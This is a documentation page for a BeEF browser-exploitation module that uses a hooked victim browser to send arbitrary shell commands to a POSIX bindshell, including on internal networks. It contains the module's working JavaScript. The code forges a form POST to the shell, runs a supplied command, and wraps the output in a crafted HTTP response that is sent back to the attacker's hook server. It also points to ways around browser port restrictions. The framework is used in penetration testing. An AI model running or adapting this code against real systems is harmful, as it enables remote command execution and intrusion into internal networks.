## Summary

* **Objective**: Execute command on a POSIX/UNIX bindshell
* **Authors**: bcoles, wade
* **Browsers**: Firefox

* [Code](https://github.com/beefproject/beef/tree/master/modules/ipec/inter_protocol_posix_bindshell)

## Internal Working

Using Inter-protocol Exploitation/Communication (IPEC) the hooked browser will send commands to a listening POSIX shell bound on the target specified in the 'Target Address' input field.

The target address can be on the hooked browser's subnet which is potentially not directly accessible from the Internet.

This module uses commands on the POSIX shell such as `/bin/sh` and `echo` to craft a valid HTTP response that can be parsed correctly by the BeEF hook server.

```js

var action = "http://" + ip + ":" + port + "/index.html?&/bin/sh;";
var parent = window.location.href;

// create form
myform=document.createElement("form");
myform.setAttribute("name","data");
myform.setAttribute("method","post");
myform.setAttribute("enctype","multipart/form-data");
myform.setAttribute("action",action);
document.getElementById("ipc_posix_window_<%= @command_id %>").contentWindow.document.body.appendChild(myform);

body1="<html><body><div id='ipc_content'>";
body2="__END_OF_POSIX_IPC<%= @command_id %>__</div><s"+"cript>window.location='"+parent+"#ipc_result='+encodeURI(document.getElementById(\\\"ipc_content\\\").innerHTML);</"+"script></body></html>";

// post results separator
myExt = document.createElement("INPUT");
myExt.setAttribute("id",<%= @command_id %>);
myExt.setAttribute("name",<%= @command_id %>);
myExt.setAttribute("value","echo -e HTTP/1.1 200 OK\\\\r;echo -e Content-Type: text/html\\\\r;echo -e Content-Length: "+(body1.length+cmd.length+body2.length+size*1)+"\\\\r;echo -e Keep-Alive: timeout=5,max=100\\\\r;echo -e Connection: keep-alive\\\\r;echo -e \\\\r;echo \""+body1+"\";(" + cmd + ")|head -c "+size+" ; ");
myform.appendChild(myExt);


```


## References

Some ports are restricted in newer versions of Chrome-like browsers and Firefox
e.g. (21,22,23,25,513 etc.)
https://e1tips.com/2014/03/17/allow-firefox-chrome-to-access-restricted-ports/

## Feedback


